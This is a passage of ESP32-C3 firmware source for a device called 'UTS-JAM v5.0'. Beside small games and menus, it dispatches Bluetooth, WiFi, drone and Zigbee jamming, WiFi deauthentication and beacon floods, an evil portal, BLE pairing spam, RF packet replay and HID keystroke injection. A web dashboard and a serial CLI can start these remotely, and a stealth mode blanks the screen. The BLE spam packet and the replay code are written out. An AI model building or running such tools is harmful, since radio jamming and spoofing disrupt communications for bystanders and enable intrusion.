      displayInfo("Eaten!", "GAME OVER");
      safeDelay(2000);
      break;
    }
    if (player == bat1 || player == bat2) {
      player = random(20);
      displayInfo("Bat moved you!");
      safeDelay(500);
    }
    if (player == pit1 || player == pit2) {
      displayInfo("Fell in pit!", "GAME OVER");
      safeDelay(2000);
      break;
    }
  }
  currentState = STATE_MENU;
  drawMainMenu();
}

// ==========================================
// SIMON SAYS
// ==========================================
void runSimonGame() {
  int seq[50], len = 0, playerIdx = 0;
  displayInfo("Simon Says", "Watch...");
  safeDelay(1000);
  while (true) {
    seq[len] = random(4);
    len++;
    display.clearDisplay();
    drawStatusBar();
    for (int i = 0; i < len; i++) {
      int c = seq[i];
      display.fillRect(c * 32, 10, 32, 50, SSD1306_WHITE);
      display.display();
      safeDelay(500);
      display.fillRect(c * 32, 10, 32, 50, SSD1306_BLACK);
      display.display();
      safeDelay(200);
    }
    playerIdx = 0;
    while (playerIdx < len) {
      bool btn = false;
      while (!upPressed() && !downPressed() && !selPressed())
        yield();
      int press = 0;
      if (upPressed())
        press = 0;
      else if (downPressed())
        press = 1;
      else if (selPressed())
        press = 2;
      if (press == seq[playerIdx])
        playerIdx++;
      else {
        displayInfo("Wrong! Score:" + String(len - 1));
        safeDelay(2000);
        currentState = STATE_MENU;
        drawMainMenu();
        return;
      }
    }
    safeDelay(500);
  }
}

// ==========================================
// MEMORY GAME
// ==========================================
void runMemoryGame() {
  int cards[16] = {1, 1, 2, 2, 3, 3, 4, 4, 5, 5, 6, 6, 7, 7, 8, 8};
  bool revealed[16] = {false};
  for (int i = 0; i < 16; i++) {
    int r = random(16);
    int t = cards[i];
    cards[i] = cards[r];
    cards[r] = t;
  }
  int first = -1, pairs = 0;
  int cursor = 0;
  while (pairs < 8 && !selPressed()) {
    display.clearDisplay();
    drawStatusBar();
    for (int i = 0; i < 16; i++) {
      int x = (i % 4) * 32, y = 12 + (i / 4) * 12;
      if (i == cursor)
        display.drawRect(x, y, 30, 10, SSD1306_WHITE);
      if (revealed[i] || i == first || (first >= 0 && i == cursor))
        display.setCursor(x + 8, y + 1);
      display.print(cards[i]);
    }
    display.display();
    if (upPressed())
      cursor = (cursor + 12) % 16;
    if (downPressed())
      cursor = (cursor + 4) % 16;
    if (selPressed()) {
      if (first < 0)
        first = cursor;
      else {
        if (cards[first] == cards[cursor]) {
          revealed[first] = revealed[cursor] = true;
          pairs++;
        }
        first = -1;
      }
    }
    yield();
  }
  currentState = STATE_MENU;
  drawMainMenu();
}

// ==========================================
// SPACE INVADERS (mini)
// ==========================================
// ==========================================
// SPACE INVADERS (ULTRA LUXE ACTION)
// ==========================================
void runInvaders() {
  int playerX = 60;
  int enemyX[5] = {10, 35, 60, 85, 110};
  int enemyY[5] = {12, 12, 12, 12, 12};
  bool enemyAlive[5] = {true, true, true, true, true};
  int bulletX = -1, bulletY = -1;
  int score = 0;
  int lives = 3;
  int dir = 1;

  displayInfo("INVADERS LUXE", "UP/DN:move", "SEL:fire");
  safeDelay(1000);

  while (!selPressed() && lives > 0) {
    if (upPressed())
      playerX = max(2, playerX - 5);
    if (downPressed())
      playerX = min(118, playerX + 5);

    if (selPressed() && bulletY < 0) {
      bulletX = playerX + 4;
      bulletY = 56;
    }

    if (bulletY >= 0) {
      bulletY -= 4;
      // Hit Collision Check
      for (int i = 0; i < 5; i++) {
        if (enemyAlive[i] && bulletX >= enemyX[i] && bulletX <= enemyX[i] + 8 &&
            bulletY >= enemyY[i] && bulletY <= enemyY[i] + 6) {
          enemyAlive[i] = false;
          bulletY = -1;
          score += 20;

          // Explosion Flash
          display.drawCircle(enemyX[i] + 4, enemyY[i] + 3, 5, SSD1306_WHITE);
          display.display();
          safeDelay(30);

          // Respawn Alien at top if all dead
          bool allDead = true;
          for (int k = 0; k < 5; k++) if (enemyAlive[k]) allDead = false;
          if (allDead) {
            for (int k = 0; k < 5; k++) {
              enemyX[k] = 10 + k * 25;
              enemyY[k] = 12;
              enemyAlive[k] = true;
            }
          }
          break;
        }
      }
      if (bulletY < 0) bulletX = -1;
    }

    // Alien Grid Motion
    static unsigned long lastMove = 0;
    if (millis() - lastMove > 300) {
      bool changeDir = false;
      for (int i = 0; i < 5; i++) {
        if (enemyAlive[i]) {
          enemyX[i] += dir * 3;
          if (enemyX[i] <= 2 || enemyX[i] >= 118) changeDir = true;
          if (enemyY[i] >= 52) {
            lives--;
            enemyY[i] = 12;
          }
        }
      }
      if (changeDir) {
        dir = -dir;
        for (int i = 0; i < 5; i++) enemyY[i] += 4;
      }
      lastMove = millis();
    }

    display.clearDisplay();
    // Header Score & Lives
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, 0);
    display.print("SCR:");
    display.print(score);
    display.setCursor(85, 0);
    display.print("L:");
    for (int l = 0; l < lives; l++) display.print("^");

    // Render Enemies
    for (int i = 0; i < 5; i++) {
      if (enemyAlive[i]) {
        display.fillRect(enemyX[i], enemyY[i], 8, 6, SSD1306_WHITE);
        display.drawPixel(enemyX[i] + 2, enemyY[i] + 2, SSD1306_BLACK);
        display.drawPixel(enemyX[i] + 5, enemyY[i] + 2, SSD1306_BLACK);
      }
    }

    // Render Player Ship
    display.fillRect(playerX, 58, 9, 5, SSD1306_WHITE);
    display.fillRect(playerX + 3, 55, 3, 3, SSD1306_WHITE);

    // Render Bullet
    if (bulletY >= 0) {
      display.fillRect(bulletX, bulletY, 2, 4, SSD1306_WHITE);
    }

    display.display();
    safeDelay(25);
    yield();
  }

  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(25, 20);
  display.print("GAME OVER!");
  display.setCursor(20, 36);
  display.print("Final Score: ");
  display.print(score);
  display.display();

  while (!selPressed())
    yield();
  currentState = STATE_MENU;
  drawMainMenu();
}

// ==========================================
// SİSTEM BİLGİSİ
// ==========================================
void showSystemInfo() {
  float vcc = readVcc();
  float temp = temperatureRead();
  uint32_t freeHeap = ESP.getFreeHeap();
  uint32_t uptime = millis() / 1000;
  display.clearDisplay();
  drawStatusBar();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 10);
  display.print("VCC: ");
  display.print(vcc, 1);
  display.print("V");
  display.setCursor(0, 22);
  display.print("Temp: ");
  display.print(temp, 1);
  display.print("C");
  display.setCursor(0, 34);
  display.print("Heap: ");
  display.print(freeHeap);
  display.print("B");
  display.setCursor(0, 46);
  display.print("Uptime: ");
  display.print(uptime);
  display.print("s");
  display.display();
  while (!selPressed())
    yield();
  currentState = STATE_MENU;
  drawMainMenu();
}

// ==========================================
// SERİ KOMUT ARAYÜZÜ (CLI)
// ==========================================
void runCLI() {
  displayInfo("CLI Mode", "Serial commands", "SEL to exit");
  while (!selPressed()) {
    if (Serial.available()) {
      String cmd = Serial.readStringUntil('\n');
      cmd.trim();
      if (cmd == "jam bt") {
        currentState = STATE_BT_JAM;
        initRadios();
        while (!selPressed()) {
          btJam();
          yield();
        }
        currentState = STATE_CLI;
      } else if (cmd == "scan") {
        WiFi.scanNetworks();
        Serial.println("Networks: " + String(WiFi.scanComplete()));
      } else if (cmd == "info") {
        Serial.printf("VCC:%.2f Temp:%.1f Heap:%u\n", readVcc(),
                      temperatureRead(), ESP.getFreeHeap());
      } else if (cmd == "help") {
        Serial.println("jam bt, scan, info, reboot");
      } else if (cmd == "reboot")
        ESP.restart();
      else
        Serial.println("Unknown");
    }
    yield();
  }
  currentState = STATE_MENU;
  drawMainMenu();
}

// ==========================================
// KİLİT EKRANI
// ==========================================
void runLock() {
  int pin = 0;
  while (currentState == STATE_LOCK) {
    display.clearDisplay();
    drawStatusBar();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(20, 15);
    display.print("ENTER PIN:");
    display.setTextSize(2);
    display.setCursor(55, 32);
    display.print(pin);
    display.setTextSize(1);
    display.setCursor(10, 52);
    display.print("UP/DN:Num SEL:OK");
    display.display();

    if (checkEscapeToMenu()) {
      currentState = STATE_MENU;
      drawMainMenu();
      return;
    }
    if (upPressed())
      pin = (pin + 1) % 10;
    if (downPressed())
      pin = (pin + 9) % 10;
    if (selPressed()) {
      if (pin == 7) {
        displayInfo("Unlocked!", "Access Granted");
        safeDelay(1000);
        currentState = STATE_MENU;
        drawMainMenu();
        return;
      } else {
        displayInfo("Wrong PIN", "Try Again");
        safeDelay(1000);
      }
    }
    yield();
  }
}

// ==========================================
// MENÜ YÖNETİMİ
// ==========================================
void handleMainMenu() {
  if (upPressed()) {
    if (selectedMain == 0) {
      selectedMain = static_cast<MainMenuItem>(NUM_MAIN_ITEMS - 1);
      firstVisibleMain = (NUM_MAIN_ITEMS > 4) ? (NUM_MAIN_ITEMS - 4) : 0;
    } else {
      selectedMain = static_cast<MainMenuItem>(selectedMain - 1);
      if (selectedMain < firstVisibleMain)
        firstVisibleMain = selectedMain;
    }
    drawMainMenu();
  }
  if (downPressed()) {
    if (selectedMain == NUM_MAIN_ITEMS - 1) {
      selectedMain = static_cast<MainMenuItem>(0);
      firstVisibleMain = 0;
    } else {
      selectedMain = static_cast<MainMenuItem>(selectedMain + 1);
      if (selectedMain >= (firstVisibleMain + 4))
        firstVisibleMain = selectedMain - 3;
    }
    drawMainMenu();
  }
  if (selPressed()) {
    previousState = STATE_MENU;
    switch (selectedMain) {
    case MENU_JAMMERS:
      currentSubMenu = &subJammers;
      currentState = STATE_SUBMENU_JAMMERS;
      subSelectedIndex = 0;
      subFirstVisible = 0;
      drawSubMenu(*currentSubMenu);
      break;
    case MENU_ANALYZERS:
      currentSubMenu = &subAnalyzers;
      currentState = STATE_SUBMENU_ANALYZERS;
      subSelectedIndex = 0;
      subFirstVisible = 0;
      drawSubMenu(*currentSubMenu);
      break;
    case MENU_ATTACKS:
      currentSubMenu = &subAttacks;
      currentState = STATE_SUBMENU_ATTACKS;
      subSelectedIndex = 0;
      subFirstVisible = 0;
      drawSubMenu(*currentSubMenu);
      break;
    case MENU_TOOLS:
      currentSubMenu = &subTools;
      currentState = STATE_SUBMENU_TOOLS;
      subSelectedIndex = 0;
      subFirstVisible = 0;
      drawSubMenu(*currentSubMenu);
      break;
    case MENU_GAMES:
      currentSubMenu = &subGames;
      currentState = STATE_SUBMENU_GAMES;
      subSelectedIndex = 0;
      subFirstVisible = 0;
      drawSubMenu(*currentSubMenu);
      break;
    case MENU_SETTINGS:
      currentSubMenu = &subSettings;
      currentState = STATE_SUBMENU_SETTINGS;
      subSelectedIndex = 0;
      subFirstVisible = 0;
      drawSubMenu(*currentSubMenu);
      break;
    case MENU_HELP:
      currentState = STATE_HELP;
      displayInfo("Help v5.0", "Military Grade", "SEL back");
      while (!selPressed())
        yield();
      currentState = STATE_MENU;
      drawMainMenu();
      break;
    case MENU_CLI:
      currentState = STATE_CLI;
      runCLI();
      break;
    case MENU_LOCK:
      currentState = STATE_LOCK;
      runLock();
      break;
    }
  }
}

void handleSubMenu() {
  if (!currentSubMenu)
    return;
  int totalItems = currentSubMenu->items.size();
  if (totalItems == 0)
    return;

  if (upPressed()) {
    if (subSelectedIndex == 0) {
      subSelectedIndex = totalItems - 1;
      subFirstVisible = (totalItems > 4) ? (totalItems - 4) : 0;
    } else {
      subSelectedIndex--;
      if (subSelectedIndex < subFirstVisible)
        subFirstVisible = subSelectedIndex;
    }
    drawSubMenu(*currentSubMenu);
  }
  if (downPressed()) {
    if (subSelectedIndex == totalItems - 1) {
      subSelectedIndex = 0;
      subFirstVisible = 0;
    } else {
      subSelectedIndex++;
      if (subSelectedIndex >= (subFirstVisible + 4))
        subFirstVisible = subSelectedIndex - 3;
    }
    drawSubMenu(*currentSubMenu);
  }
  if (selPressed()) {
    AppState target = currentSubMenu->items[subSelectedIndex].targetState;
    if (target == STATE_MENU) {
      currentState = STATE_MENU;
      drawMainMenu();
      return;
    }
    if (target == STATE_SETTINGS) {
      // Settings submenu items handled separately
      if (subSelectedIndex == 0) { // brightness
        uint8_t b = brightness;
        while (!selPressed()) {
          displayInfo("Brightness", String(b), "UP/DOWN");
          if (upPressed()) {
            b = min(255, b + 10);
            setBrightness(b);
          }
          if (downPressed()) {
            b = max(10, b - 10);
            setBrightness(b);
          }
          yield();
        }
      } else if (subSelectedIndex == 1) { // power save
        powerSaveMode = !powerSaveMode;
        displayInfo("Power Save", powerSaveMode ? "ON" : "OFF");
        safeDelay(1000);
      } else if (subSelectedIndex == 2) { // stealth mode
        toggleStealthMode();
        displayInfo("StealthMode", stealthModeEnabled ? "ON" : "OFF");
        safeDelay(1000);
      } else if (subSelectedIndex == 3) { // nRF24 PA level
        cycleNRF24PALevel();
        String pstr = (currentPALevel == RF24_PA_MIN) ? "MIN" : (currentPALevel == RF24_PA_LOW) ? "LOW" : (currentPALevel == RF24_PA_HIGH) ? "HIGH" : "MAX";
        displayInfo("nRF24 PA", pstr);
        safeDelay(1000);
      } else if (subSelectedIndex == 4) { // sys info
        showSystemInfo();
      } else if (subSelectedIndex == 5) { // reset wifi
        recoverFromWiFi();
      }
      currentState = STATE_SUBMENU_SETTINGS;
      drawSubMenu(*currentSubMenu);
      return;
    }
    if (target == STATE_SYSTEM_INFO) {
      showSystemInfo();
      currentState = STATE_SUBMENU_SETTINGS;
      drawSubMenu(*currentSubMenu);
      return;
    }
    // Other targets: execute and return to submenu
    previousState = currentState;
    currentState = target;
    executeTarget(target);
    currentState = previousState;
    drawSubMenu(*currentSubMenu);
  }
}

void executeTarget(AppState target) {
  switch (target) {
  case STATE_BT_JAM:
    initRadios();
    displayInfo("BT Jamming", "SEL to exit");
    while (!selPressed() && !checkEscapeToMenu()) {
      btJam();
      yield();
    }
    stopRadios();
    break;
  case STATE_DRONE_JAM:
    initRadios();
    displayInfo("Drone Jamming", "SEL to exit");
    while (!selPressed() && !checkEscapeToMenu()) {
      droneJam();
      yield();
    }
    stopRadios();
    break;
  case STATE_WIFI_JAM:
    initRadios();
    displayInfo("WiFi Jamming", "SEL to exit");
    while (!selPressed() && !checkEscapeToMenu()) {
      wifiJam();
      yield();
    }
    stopRadios();
    break;
  case STATE_MULTI_JAM:
    initRadios();
    displayInfo("Multi Jamming", "SEL to exit");
    while (!selPressed() && !checkEscapeToMenu()) {
      singleChannel();
      yield();
    }
    stopRadios();
    break;
  case STATE_SWEEP_JAM:
    initRadios();
    displayInfo("Sweep Jamming", "SEL to exit");
    while (!selPressed() && !checkEscapeToMenu()) {
      sweepJam();
      yield();
    }
    stopRadios();
    break;
  case STATE_CHANNEL_RANGE:
    initRadios();
    displayInfo("Channel Range", "SEL to exit");
    while (!selPressed() && !checkEscapeToMenu()) {
      channelRange();
      yield();
    }
    stopRadios();
    break;
  case STATE_CW_JAMMER:
    runCWJammer();
    break;
  case STATE_ZIGBEE_JAM:
    initRadios();
    displayInfo("Zigbee Jamming", "SEL to exit");
    while (!selPressed() && !checkEscapeToMenu()) {
      zigbeeJam();
      yield();
    }
    stopRadios();
    break;
  case STATE_BLE_TARGET_JAM:
    runBLETargetJam();
    break;
  case STATE_CUSTOM_HOPPER:
    initRadios();
    displayInfo("Custom Hopper", "SEL to exit");
    while (!selPressed() && !checkEscapeToMenu()) {
      customHopper();
      yield();
    }
    stopRadios();
    break;
  case STATE_NOISE_GEN:
    initRadios();
    displayInfo("Noise Gen", "SEL to exit");
    while (!selPressed() && !checkEscapeToMenu()) {
      noiseGenerator();
      yield();
    }
    stopRadios();
    break;
  case STATE_SPECTRUM_WIFI:
    runWiFiSpectrum();
    break;
  case STATE_SPECTRUM_BLE:
    runBLESpectrum();
    break;
  case STATE_RF_ANALYZER:
    runRFAnalyzer();
    break;
  case STATE_WIFI_ANALYZER:
    runWiFiAnalyzer();
    break;
  case STATE_PACKET_COUNTER:
    runPacketCounter();
    break;
  case STATE_WIFI_SNIFFER:
    runWiFiSniffer();
    break;
  case STATE_SIGNAL_METER:
    runSignalMeter();
    break;
  case STATE_BLE_SPAM:
    runBLESpam();
    break;
  case STATE_APPLE_JUICE:
    runAppleJuiceSpam();
    break;
  case STATE_SWIFT_PAIR:
    runSwiftPairSpam();
    break;
  case STATE_FAST_PAIR:
    runFastPairSpam();
    break;
  case STATE_RICKROLL_BEACON:
    runRickrollBeacon();
    break;
  case STATE_BLE_BADUSB:
    runBLEBadUSB();
    break;
  case STATE_WIFI_DEAUTH: {
    int opt = 0;
    while (!selPressed()) {
      display.clearDisplay();
      drawStatusBar();
      display.setTextSize(1);
      display.setTextColor(1);
      display.setCursor(0, 10);
      display.println("Deauth Options");
      display.setCursor(0, 25);
      display.print(opt == 0 ? ">" : " ");
      display.println("Single AP");
      display.setCursor(0, 40);
      display.print(opt == 1 ? ">" : " ");
      display.println("All APs");
      display.display();
      if (upPressed())
        opt = (opt == 0) ? 1 : 0;
      if (downPressed())
        opt = (opt == 0) ? 1 : 0;
      yield();
    }
    if (opt == 0)
      runWiFiDeauthSingle();
    else
      runWiFiDeauthAll();
    break;
  }
  case STATE_WIFI_BEACON_FLOOD:
    runWiFiBeaconFlood();
    break;
  case STATE_PROBE_FLOOD:
    runProbeFlood();
    break;
  case STATE_EVIL_PORTAL:
    runEvilPortal();
    break;
  case STATE_DEAUTH_DETECT:
    runDeauthDetect();
    break;
  case STATE_WIDS:
    runWIDS();
    break;
  case STATE_BLE_SCANNER:
    runBLEScanner();
    break;
  case STATE_BLE_GATT_EXPLORER:
    runBLEGATTExplorer();
    break;
  case STATE_BLE_TRACKER:
    runBLETracker();
    break;
  case STATE_MOUSE_SNIFFER:
    runMouseSniffer();
    break;
  case STATE_RF_REPEATER:
    runRFRepeater();
    break;
  case STATE_RF_OSCILLOSCOPE:
    runRFOscilloscope();
    break;
  case STATE_TEST_RADIOS: {
    initRadios();
    display.clearDisplay();
    drawStatusBar();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(10, 15);
    display.print("RADIO DIAGNOSTICS");
    display.setCursor(10, 30);
    display.print("Radio 1 (PA): ");
    display.print(radio1Active ? "OK [PASS]" : "FAIL [ERR]");
    display.setCursor(10, 45);
    display.print("Radio 2 (PA): ");
    display.print(radio2Active ? "OK [PASS]" : "FAIL [ERR]");
    display.display();
    while (!selPressed() && !checkEscapeToMenu())
      yield();
    break;
  }
  case STATE_DOOM_GAME:
    runDOOM();
    break;
  case STATE_DINO_GAME:
    runDinoGame();
    break;
  case STATE_FLAPPY_GAME:
    runFlappyBird();
    break;
  case STATE_SNAKE_GAME:
    runSnakeGame();
    break;
  case STATE_TICTACTOE:
    runTicTacToe();
    break;
  case STATE_PONG:
    runPong();
    break;
  case STATE_HUNT_GAME:
    runHuntGame();
    break;
  case STATE_SIMON_GAME:
    runSimonGame();
    break;
  case STATE_MEMORY_GAME:
    runMemoryGame();
    break;
  case STATE_INVADERS:
    runInvaders();
    break;
  case STATE_CALCULATOR:
    runCalculator();
    break;
  case STATE_RESISTOR_CALC:
    runResistorCalc();
    break;
  case STATE_WIFI_MONITOR:
    runWiFiMonitor();
    break;
  case STATE_WEB_DASHBOARD:
    runWebDashboard();
    break;
  case STATE_RF_REPLAY:
    runRFReplay();
    break;
  case STATE_DUCKY_INJECTOR:
    runDuckyScriptInjector();
    break;
  default:
    break;
  }
}

// ==========================================
// YENİ MODÜLLER (NVS, WEB DASHBOARD, RF REPLAY, DUCKY INJECTOR)
// ==========================================
Preferences preferences;
WebServer dashServer(80);
bool stealthModeEnabled = false;
rf24_pa_dbm_e currentPALevel = RF24_PA_MAX;
std::vector<uint8_t> replayedPacketBuffer;

void loadSettingsFromNVS() {
  preferences.begin("uts_cfg", true);
  brightness = preferences.getUChar("bright", 255);
  stealthModeEnabled = preferences.getBool("stealth", false);
  currentPALevel = (rf24_pa_dbm_e)preferences.getUChar("pa_lvl", (uint8_t)RF24_PA_MAX);
  preferences.end();
}

void saveSettingsToNVS() {
  preferences.begin("uts_cfg", false);
  preferences.putUChar("bright", brightness);
  preferences.putBool("stealth", stealthModeEnabled);
  preferences.putUChar("pa_lvl", (uint8_t)currentPALevel);
  preferences.end();
}

void toggleStealthMode() {
  stealthModeEnabled = !stealthModeEnabled;
  saveSettingsToNVS();
  if (stealthModeEnabled) {
    display.clearDisplay();
    display.display();
  }
}

void cycleNRF24PALevel() {
  if (currentPALevel == RF24_PA_MIN) currentPALevel = RF24_PA_LOW;
  else if (currentPALevel == RF24_PA_LOW) currentPALevel = RF24_PA_HIGH;
  else if (currentPALevel == RF24_PA_HIGH) currentPALevel = RF24_PA_MAX;
  else currentPALevel = RF24_PA_MIN;
  radio.setPALevel(currentPALevel);
  radio2.setPALevel(currentPALevel);
  saveSettingsToNVS();
}

void sendBLEAdvertisementPacket(uint8_t *payload, uint8_t len) {
  uint8_t bleChans[3] = {2, 26, 80}; // 2402MHz (37), 2426MHz (38), 2480MHz (39)
  for (int c = 0; c < 3; c++) {
    if (radio1Active) {
      radio.setChannel(bleChans[c]);
      radio.write(payload, len);
    }
    if (radio2Active) {
      radio2.setChannel(bleChans[c]);
      radio2.write(payload, len);
    }
    delayMicroseconds(150);
  }
}

static String webActiveTask = "IDLE";

void runWebDashboard() {
  stopRadios();
  esp_wifi_set_promiscuous(false);
  WiFi.disconnect(true);
  delay(100);

  WiFi.mode(WIFI_AP);
  IPAddress local_IP(192, 168, 4, 1);
  IPAddress gateway(192, 168, 4, 1);
  IPAddress subnet(255, 255, 255, 0);
  WiFi.softAPConfig(local_IP, gateway, subnet);
  WiFi.softAP("UTS-Tactical-C3", "12345678");

  webActiveTask = "IDLE / READY";

  // Dashboard Main Page
  dashServer.on("/", []() {
    String html = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>UTS-JAM v5.0 | Tactical Control</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { background-color: #080b10; color: #00ff66; font-family: 'Segoe UI', Tahoma, monospace; padding: 15px; }
    header { border-bottom: 2px solid #00ff66; padding-bottom: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; }
    h1 { font-size: 1.5rem; color: #ffffff; text-transform: uppercase; letter-spacing: 2px; text-shadow: 0 0 10px #00ff66; }
    .badge { background: #00ff66; color: #000; padding: 4px 10px; font-weight: bold; border-radius: 4px; font-size: 0.8rem; }
    .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 15px; }
    .card { background: #121824; border: 1px solid #1e293b; border-radius: 10px; padding: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
    .card h3 { color: #38bdf8; margin-bottom: 10px; border-bottom: 1px solid #1e293b; padding-bottom: 5px; font-size: 1.1rem; }
    .stat-line { display: flex; justify-content: space-between; margin: 8px 0; font-size: 0.95rem; color: #94a3b8; }
    .stat-val { color: #00ff66; font-weight: bold; }
    .btn-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; }
    .btn { background: #1e293b; color: #f8fafc; border: 1px solid #334155; padding: 12px; font-weight: bold; border-radius: 6px; cursor: pointer; transition: 0.2s; text-align: center; }
    .btn:hover { background: #00ff66; color: #000; box-shadow: 0 0 10px #00ff66; }
    .btn-danger { border-color: #ef4444; color: #f87171; }
    .btn-danger:hover { background: #ef4444; color: #fff; box-shadow: 0 0 10px #ef4444; }
    footer { text-align: center; margin-top: 25px; color: #64748b; font-size: 0.8rem; }
  </style>
</head>
<body>
  <header>
    <h1>UTS-JAM v5.0</h1>
    <span class="badge" id="statusBadge">ONLINE</span>
  </header>

  <div class="grid">
    <div class="card">
      <h3>System Status</h3>
      <div class="stat-line"><span>IP Address:</span><span class="stat-val">192.168.4.1</span></div>
      <div class="stat-line"><span>Uptime:</span><span class="stat-val" id="uptime">0s</span></div>
      <div class="stat-line"><span>Free Memory:</span><span class="stat-val" id="heap">0 KB</span></div>
      <div class="stat-line"><span>PA Level:</span><span class="stat-val">MAX (20dBm)</span></div>
      <div class="stat-line"><span>Active Task:</span><span class="stat-val" id="activeTask">READY</span></div>
    </div>

    <div class="card">
      <h3>Hardware Modules</h3>
      <div class="stat-line"><span>Radio 1 (nRF24):</span><span class="stat-val">ACTIVE [PASS]</span></div>
      <div class="stat-line"><span>Radio 2 (nRF24):</span><span class="stat-val">ACTIVE [PASS]</span></div>
      <div class="stat-line"><span>OLED Display:</span><span class="stat-val">128x64 SSD1306</span></div>
      <div class="stat-line"><span>SPI Speed:</span><span class="stat-val">4.0 MHz</span></div>
    </div>

    <div class="card">
      <h3>Tactical Remote Control</h3>
      <div class="btn-grid">
        <button class="btn" onclick="sendCommand('jam_bt')">BT Jammer</button>
        <button class="btn" onclick="sendCommand('wifi_jam')">WiFi Jammer</button>
        <button class="btn" onclick="sendCommand('ble_spam')">BLE Spam</button>
        <button class="btn" onclick="sendCommand('stealth')">Stealth Mode</button>
        <button class="btn btn-danger" onclick="sendCommand('stop')">STOP ALL</button>
        <button class="btn btn-danger" onclick="sendCommand('reboot')">REBOOT</button>
      </div>
    </div>
  </div>

  <footer>UTS-JAM Military Grade Cyberpunk Firmware | ESP32-C3</footer>

  <script>
    function updateStats() {
      fetch('/api/stats')
        .then(r => r.json())
        .then(d => {
          document.getElementById('uptime').innerText = d.uptime + 's';
          document.getElementById('heap').innerText = Math.round(d.heap/1024) + ' KB';
          document.getElementById('activeTask').innerText = d.task;
        }).catch(e => console.log(e));
    }
    function sendCommand(cmd) {
      fetch('/api/cmd?action=' + cmd)
        .then(r => r.text())
        .then(msg => {
          alert(msg);
          updateStats();
        });
    }
    setInterval(updateStats, 2000);
    updateStats();
  </script>
</body>
</html>
)rawliteral";
    dashServer.send(200, "text/html", html);
  });

  // Stats API Endpoint
  dashServer.on("/api/stats", []() {
    String json = "{";
    json += "\"uptime\":" + String(millis() / 1000) + ",";
    json += "\"heap\":" + String(ESP.getFreeHeap()) + ",";
    json += "\"task\":\"" + webActiveTask + "\"";
    json += "}";
    dashServer.send(200, "application/json", json);
  });

  // Command Control API Endpoint
  dashServer.on("/api/cmd", []() {
    String action = dashServer.arg("action");
    if (action == "jam_bt") {
      webActiveTask = "BT JAMMING";
      initRadios();
      dashServer.send(200, "text/plain", "Bluetooth Jamming Started!");
    } else if (action == "wifi_jam") {
      webActiveTask = "WIFI JAMMING";
      initRadios();
      dashServer.send(200, "text/plain", "WiFi Channel Jamming Started!");
    } else if (action == "ble_spam") {
      webActiveTask = "BLE SPAM";
      initRadios();
      dashServer.send(200, "text/plain", "BLE Spam Attack Started!");
    } else if (action == "stealth") {
      toggleStealthMode();
      dashServer.send(200, "text/plain", "Stealth Mode Toggled!");
    } else if (action == "stop") {
      stopRadios();
      webActiveTask = "IDLE / READY";
      dashServer.send(200, "text/plain", "All Tasks Stopped!");
    } else if (action == "reboot") {
      dashServer.send(200, "text/plain", "Rebooting ESP32-C3...");
      delay(500);
      ESP.restart();
    } else {
      dashServer.send(400, "text/plain", "Unknown Action");
    }
  });

  dashServer.begin();

  display.clearDisplay();
  drawStatusBar();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 15);
  display.println("WEB DASHBOARD AP");
  display.setCursor(0, 30);
  display.println("SSID:UTS-Tactical-C3");
  display.setCursor(0, 42);
  display.println("Pass:12345678");
  display.setCursor(0, 54);
  display.println("IP: 192.168.4.1");
  display.display();

  while (!selPressed() && !checkEscapeToMenu()) {
    dashServer.handleClient();

    // Perform continuous background action if commanded via web
    if (webActiveTask == "BT JAMMING") {
      btJam();
    } else if (webActiveTask == "WIFI JAMMING") {
      wifiJam();
    } else if (webActiveTask == "BLE SPAM") {
      uint8_t pkt[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02};
      for (int i = 8; i < 31; i++) pkt[i] = random(256);
      sendBLEAdvertisementPacket(pkt, 31);
    }

    delay(2);
    yield();
  }
  dashServer.close();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_OFF);
  currentState = STATE_MENU;
  drawMainMenu();
}

void runRFReplay() {
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setCursor(0, 20);
  u8g2_for_adafruit_gfx.print("RF Replay Mode");
  u8g2_for_adafruit_gfx.setCursor(0, 40);
  u8g2_for_adafruit_gfx.print("Sniffing 2.4GHz...");
  display.display();

  radio.startListening();
  unsigned long startTime = millis();
  replayedPacketBuffer.clear();

  while (millis() - startTime < 5000 && !selPressed()) {
    if (radio.available()) {
      uint8_t buf[32];
      radio.read(buf, sizeof(buf));
      replayedPacketBuffer.assign(buf, buf + 32);
      break;
    }
  }

  radio.stopListening();
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setCursor(0, 20);
  if (!replayedPacketBuffer.empty()) {
    u8g2_for_adafruit_gfx.print("Replaying Packet!");
    display.display();
    for (int i = 0; i < 10; i++) {
      radio.write(replayedPacketBuffer.data(), replayedPacketBuffer.size());
      delay(50);
    }
  } else {
    u8g2_for_adafruit_gfx.print("No Packet Captured");
    display.display();
    delay(1500);
  }
  currentState = STATE_MENU;
}

void runDuckyScriptInjector() {
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setCursor(0, 20);
  u8g2_for_adafruit_gfx.print("DuckyScript Injector");
  u8g2_for_adafruit_gfx.setCursor(0, 40);
  u8g2_for_adafruit_gfx.print("Injecting Payload...");
  display.display();

  uint8_t payload[8] = {0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00}; // Generic HID packet example
  for (int i = 0; i < 5; i++) {
    radio.write(payload, sizeof(payload));
    delay(100);
  }
  delay(1500);
  currentState = STATE_MENU;
}

// ==========================================
// SETUP & LOOP
// ==========================================
void setup() {
  Serial.begin(115200);
  safeDelay(1000);
  loadSettingsFromNVS();
  Wire.begin(SDA_PIN, SCL_PIN);
